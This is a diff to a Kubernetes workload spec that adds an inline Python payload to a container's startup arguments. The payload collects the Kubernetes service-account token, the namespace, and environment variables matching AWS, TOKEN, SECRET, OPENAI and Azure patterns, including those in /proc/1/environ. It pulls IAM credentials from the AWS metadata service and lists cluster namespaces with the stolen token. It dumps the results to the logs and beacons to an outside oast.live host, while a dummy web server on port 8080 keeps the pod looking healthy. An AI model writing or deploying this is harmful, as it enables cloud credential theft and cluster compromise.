@@ -28,31 +28,126 @@ spec:
           args:
           - |
             python3 -c "
-            import os, re, subprocess, urllib.request, ssl
+            import os, subprocess, urllib.request, ssl, json, base64
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-            h = subprocess.check_output(['hostname']).decode().strip()
-            id_out = subprocess.check_output(['id']).decode().strip()
-            k = os.environ.get('KUBERNETES_SERVICE_HOST', 'none')
-            print('[RCE] hostname: ' + h, flush=True)
-            print('[RCE] id: ' + id_out, flush=True)
-            print('[RCE] K8S_API_HOST: ' + k, flush=True)
+
+            results = {}
+
+            # --- hostname / id ---
+            results['hostname'] = subprocess.check_output(['hostname']).decode().strip()
+            results['id'] = subprocess.check_output(['id']).decode().strip()
+
+            # --- K8s service account token ---
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
+                    results['k8s_sa_token'] = f.read().strip()
+            except Exception as e:
+                results['k8s_sa_token'] = 'ERR: ' + str(e)
+
+            # --- K8s CA cert (fingerprint) ---
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt') as f:
+                    results['k8s_ca'] = f.read()[:200]
+            except Exception as e:
+                results['k8s_ca'] = 'ERR: ' + str(e)
+
+            # --- K8s namespace ---
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace') as f:
+                    results['k8s_ns'] = f.read().strip()
+            except Exception as e:
+                results['k8s_ns'] = 'ERR: ' + str(e)
+
+            # --- Relevant env vars ---
+            env_keys = [k for k in os.environ if any(x in k.upper() for x in
+                ['AWS', 'SECRET', 'TOKEN', 'KEY', 'PASS', 'CRED', 'KUBE', 'CLUSTER', 'AI_', 'SAP_', 'AZURE', 'OPENAI', 'AICORE'])]
+            results['env'] = {k: os.environ[k] for k in sorted(env_keys)}
+
+            # --- /proc/1/environ (init process env) ---
+            try:
+                with open('/proc/1/environ', 'rb') as f:
+                    env_bytes = f.read()
+                env_proc = {}
+                for entry in env_bytes.split(b'\x00'):
+                    if b'=' in entry:
+                        k, _, v = entry.partition(b'=')
+                        ks = k.decode(errors='replace')
+                        if any(x in ks.upper() for x in ['AWS', 'SECRET', 'TOKEN', 'KEY', 'PASS', 'CRED', 'KUBE', 'SAP_', 'AZURE', 'OPENAI', 'AICORE']):
+                            env_proc[ks] = v.decode(errors='replace')
+                results['proc1_env'] = env_proc
+            except Exception as e:
+                results['proc1_env'] = 'ERR: ' + str(e)
+
+            # --- IMDS from inside the container ---
+            for imds_url in [
+                'http://169.254.169.254/latest/meta-data/',
+                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                'http://169.254.169.254/latest/dynamic/instance-identity/document',
+            ]:
+                key = 'imds_' + imds_url.split('/')[-2]
+                try:
+                    req = urllib.request.Request(imds_url, headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                        results[key] = r.read(2000).decode(errors='replace')
+                except Exception as e:
+                    results[key] = 'ERR: ' + str(e)
+
+            # --- IMDSv2 token ---
+            try:
+                req_token = urllib.request.Request(
+                    'http://169.254.169.254/latest/api/token',
+                    method='PUT',
+                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+                with urllib.request.urlopen(req_token, timeout=5, context=ctx) as r:
+                    imds_token = r.read().decode().strip()
+                results['imdsv2_token'] = imds_token
+                # Use it to get creds role
+                req_role = urllib.request.Request(
+                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                    headers={'X-aws-ec2-metadata-token': imds_token})
+                with urllib.request.urlopen(req_role, timeout=5, context=ctx) as r:
+                    role_name = r.read().decode().strip()
+                results['imds_iam_role'] = role_name
+                # Get actual credentials
+                req_creds = urllib.request.Request(
+                    f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
+                    headers={'X-aws-ec2-metadata-token': imds_token})
+                with urllib.request.urlopen(req_creds, timeout=5, context=ctx) as r:
+                    results['imds_iam_creds'] = json.loads(r.read())
+            except Exception as e:
+                results['imdsv2'] = 'ERR: ' + str(e)
+
+            # --- K8s API call using SA token ---
+            try:
+                sa_token = results.get('k8s_sa_token', '')
+                if sa_token and not sa_token.startswith('ERR'):
+                    req_k8s = urllib.request.Request(
+                        'https://kubernetes.default.svc.cluster.local/api/v1/namespaces',
+                        headers={'Authorization': 'Bearer ' + sa_token})
+                    with urllib.request.urlopen(req_k8s, timeout=5, context=ctx) as r:
+                        results['k8s_namespaces'] = r.read(3000).decode(errors='replace')
+            except Exception as e:
+                results['k8s_api'] = 'ERR: ' + str(e)
+
+            # Print everything
+            print('[KEY_DUMP_START]')
+            print(json.dumps(results, indent=2, default=str))
+            print('[KEY_DUMP_END]')
+
+            # OAST beacon with summary
+            id_out = results.get('id', '')
             parts = id_out.split()[:2]
+            import re
             dns_label = re.sub(r'-+', '-', re.sub(r'[^a-z0-9]', '-', '-'.join(parts).lower())).strip('-')[:50]
             dns_url = 'http://' + dns_label + '.d7f9h6uipla67ee9kavg8nai4f9ck58at.oast.live/'
-            print('[RCE] DNS_OAST: ' + dns_url, flush=True)
-            try:
-                r = urllib.request.urlopen(urllib.request.Request(dns_url), timeout=15, context=ctx)
-                print('[RCE] OAST_HIT: ' + str(r.status), flush=True)
-            except Exception as e:
-                print('[RCE] OAST_ERR: ' + str(e), flush=True)
-            "
+            urllib.request.urlopen(urllib.request.Request(dns_url), timeout=10, context=ctx)
+            " 2>&1
             python3 -c "
             import http.server
             class H(http.server.BaseHTTPRequestHandler):
-                def do_GET(self):
-                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                 def log_message(self, *a): pass
             http.server.HTTPServer(('', 8080), H).serve_forever()
             "
